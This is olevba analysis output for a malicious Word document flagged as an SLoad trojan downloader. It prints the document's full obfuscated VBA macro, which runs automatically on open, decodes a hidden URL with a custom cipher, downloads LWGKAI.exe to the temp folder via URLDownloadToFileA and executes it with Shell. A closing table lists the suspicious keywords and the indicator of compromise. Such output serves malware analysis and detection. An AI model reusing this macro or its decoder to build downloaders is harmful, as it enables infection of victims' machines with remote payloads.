olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Downloader.MSOffice.SLoad.gen-a04e3b8df0378efbddcdc643f144a4a3e2a8f634a2abeae2f64a398e3380eb00
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'< protected by www.CrunchCode.de - DO NOT CHANGE OR REMOVE THIS LABEL! >
Option Explicit
Const fcpxJEbzdgDJuR = "dV zoaÂ­ln.62KZ5)#qzkm!18r-6 Np!\5K&pdcuJ'{vk": Public zRsOElAGqvdVQeKkIEqpQeggMpUbOku As String
#If Win64 Then
Private Declare PtrSafe Function _
URLDownloadToFileA Lib "urlmon" (ByVal NRTMLM As Long, ByVal UUQCES As String, _
ByVal VKDDKH As String, _
ByVal nGRoUFCwTJzqpuFxJbFYP As Long, ByVal _
RPBFSI As Long) As Long
#Else
Private Declare Function URLDownloadToFileA Lib "urlmon" (ByVal NRTMLM As Long, _
ByVal UUQCES As _
String, ByVal VKDDKH As _
String, ByVal nGRoUFCwTJzqpuFxJbFYP As _
Long, _
ByVal RPBFSI As _
Long) As _
Long
#End If
Public Sub _
JXVMGB()
XWUXKT PIDaizKkhiZDJavLiSkCszTcCizFTvj(fcpxJEbzdgDJuR), Environ( _
"TMP") & "\LWGKAI.exe"
End Sub
Function PIDaizKkhiZDJavLiSkCszTcCizFTvj( _
TPWzTOp As String) As String
PIDaizKkhiZDJavLiSkCszTcCizFTvj = _
QtkXVGhqxnLxOrCbkZbuUPrGanJFhLS( _
TPWzTOp)
End Function
Sub SwnPadqYHVKpEFrAYOipVf()
Auto_Open
End Sub
Function XWUXKT(QJUIHL As String, KPJVVW As String) As Boolean
Dim ePZusrCwueRfbwsjfGPWOYXtjVSCiM As Long: ePZusrCwueRfbwsjfGPWOYXtjVSCiM = _
URLDownloadToFileA(0, QJUIHL, KPJVVW, 0, 0)
If _
ePZusrCwueRfbwsjfGPWOYXtjVSCiM = 0 Then XWUXKT = True
Dim UiSqGdqKkocCSZjJj
UiSqGdqKkocCSZjJj = Shell(KPJVVW, 1)
End Function
Function QtkXVGhqxnLxOrCbkZbuUPrGanJFhLS( _
QDQaqLNlQgZxIjvLv As String) As String
Dim pesuKHFbOExNgnILDiAOTevjExbBm As Byte, _
iHwhJlzPAIOtFbSRyaArUjPkmGugMIW As Long, _
nyYzHVegcZlUvmPtz As Integer, pMBWTqgwOFzYzPpGDIErcLiJ As Integer, _
FuEpCkIVy As Long, qtajiIaSuvCghIDYfEFGdiPxDcpSUIO As Long, tHPuDDND As Long, QZoINTNcqptUYaGjgKnqVfXQaoq As String, _
bvrBDqqNDxVwDKHVmHlohhnIMvDOIf As String, _
BxLVSgYNQankOARFvlg As String, _
rSvbmDjsMYEBjZHjZCzwiAmyshYJS As String, _
yCkoVMzlaTWCoEzaLVUWNDNdwF As String
BxLVSgYNQankOARFvlg = ""
If QDQaqLNlQgZxIjvLv <> _
"" Then
rSvbmDjsMYEBjZHjZCzwiAmyshYJS = _
QDQaqLNlQgZxIjvLv
pesuKHFbOExNgnILDiAOTevjExbBm = 14168 - &H36AB
pMBWTqgwOFzYzPpGDIErcLiJ = InStr(QDQaqLNlQgZxIjvLv, Chr(pesuKHFbOExNgnILDiAOTevjExbBm))
If _
zRsOElAGqvdVQeKkIEqpQeggMpUbOku = "" Then
yCkoVMzlaTWCoEzaLVUWNDNdwF = """"
For FuEpCkIVy = 7991 - &H1F17 To &H7174 - 28918
If InStr(yCkoVMzlaTWCoEzaLVUWNDNdwF, Chr( _
FuEpCkIVy)) = 0 Then zRsOElAGqvdVQeKkIEqpQeggMpUbOku = zRsOElAGqvdVQeKkIEqpQeggMpUbOku & _
Chr(FuEpCkIVy)
Next FuEpCkIVy
End If
tHPuDDND = Len(zRsOElAGqvdVQeKkIEqpQeggMpUbOku)
bvrBDqqNDxVwDKHVmHlohhnIMvDOIf = _
Left(rSvbmDjsMYEBjZHjZCzwiAmyshYJS, _
pMBWTqgwOFzYzPpGDIErcLiJ - 1)
rSvbmDjsMYEBjZHjZCzwiAmyshYJS = Right(rSvbmDjsMYEBjZHjZCzwiAmyshYJS, Len(rSvbmDjsMYEBjZHjZCzwiAmyshYJS) - _
pMBWTqgwOFzYzPpGDIErcLiJ)
QZoINTNcqptUYaGjgKnqVfXQaoq = _
""
For _
FuEpCkIVy = _
1 To Len(rSvbmDjsMYEBjZHjZCzwiAmyshYJS) Step _
2
QZoINTNcqptUYaGjgKnqVfXQaoq = QZoINTNcqptUYaGjgKnqVfXQaoq & _
Mid(rSvbmDjsMYEBjZHjZCzwiAmyshYJS, FuEpCkIVy + 1, 1) & Mid( _
rSvbmDjsMYEBjZHjZCzwiAmyshYJS, _
FuEpCkIVy, _
1)
Next FuEpCkIVy
rSvbmDjsMYEBjZHjZCzwiAmyshYJS = QZoINTNcqptUYaGjgKnqVfXQaoq
qtajiIaSuvCghIDYfEFGdiPxDcpSUIO = _
0
For FuEpCkIVy = 1 To _
Len( _
rSvbmDjsMYEBjZHjZCzwiAmyshYJS)
QZoINTNcqptUYaGjgKnqVfXQaoq = Mid(rSvbmDjsMYEBjZHjZCzwiAmyshYJS, FuEpCkIVy, 1)
iHwhJlzPAIOtFbSRyaArUjPkmGugMIW = Asc(QZoINTNcqptUYaGjgKnqVfXQaoq)
pMBWTqgwOFzYzPpGDIErcLiJ = InStr(zRsOElAGqvdVQeKkIEqpQeggMpUbOku, QZoINTNcqptUYaGjgKnqVfXQaoq)
If _
pMBWTqgwOFzYzPpGDIErcLiJ = 0 Then
If _
iHwhJlzPAIOtFbSRyaArUjPkmGugMIW >= (7242 - &H1BCA) Then
iHwhJlzPAIOtFbSRyaArUjPkmGugMIW = iHwhJlzPAIOtFbSRyaArUjPkmGugMIW + (&H59B0 - 22896)
If iHwhJlzPAIOtFbSRyaArUjPkmGugMIW > _
(23924 - &H5C75) Then iHwhJlzPAIOtFbSRyaArUjPkmGugMIW = iHwhJlzPAIOtFbSRyaArUjPkmGugMIW - _
(&H73C5 - _
29509)
QZoINTNcqptUYaGjgKnqVfXQaoq = Chr(iHwhJlzPAIOtFbSRyaArUjPkmGugMIW)
End If
BxLVSgYNQankOARFvlg = BxLVSgYNQankOARFvlg & QZoINTNcqptUYaGjgKnqVfXQaoq
Else
qtajiIaSuvCghIDYfEFGdiPxDcpSUIO = qtajiIaSuvCghIDYfEFGdiPxDcpSUIO + _
1
If qtajiIaSuvCghIDYfEFGdiPxDcpSUIO > _
Len(bvrBDqqNDxVwDKHVmHlohhnIMvDOIf) Then qtajiIaSuvCghIDYfEFGdiPxDcpSUIO = _
1
nyYzHVegcZlUvmPtz = Asc(Mid(bvrBDqqNDxVwDKHVmHlohhnIMvDOIf, _
qtajiIaSuvCghIDYfEFGdiPxDcpSUIO, 1))
pMBWTqgwOFzYzPpGDIErcLiJ = pMBWTqgwOFzYzPpGDIErcLiJ - _
nyYzHVegcZlUvmPtz
While pMBWTqgwOFzYzPpGDIErcLiJ > _
tHPuDDND
pMBWTqgwOFzYzPpGDIErcLiJ = pMBWTqgwOFzYzPpGDIErcLiJ - _
tHPuDDND
Wend
While _
pMBWTqgwOFzYzPpGDIErcLiJ < 0
pMBWTqgwOFzYzPpGDIErcLiJ = pMBWTqgwOFzYzPpGDIErcLiJ + tHPuDDND
Wend
If pMBWTqgwOFzYzPpGDIErcLiJ = _
0 Then pMBWTqgwOFzYzPpGDIErcLiJ = tHPuDDND
BxLVSgYNQankOARFvlg = BxLVSgYNQankOARFvlg & Mid( _
zRsOElAGqvdVQeKkIEqpQeggMpUbOku, pMBWTqgwOFzYzPpGDIErcLiJ, 1)
End If
Next FuEpCkIVy
End If
QtkXVGhqxnLxOrCbkZbuUPrGanJFhLS = BxLVSgYNQankOARFvlg
End Function
Sub _
Auto_Open()
JXVMGB
End Sub
Sub _
AutoOpen()
Auto_Open
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|URLDownloadToFileA  |May download files from the Internet         |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|IOC       |LWGKAI.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

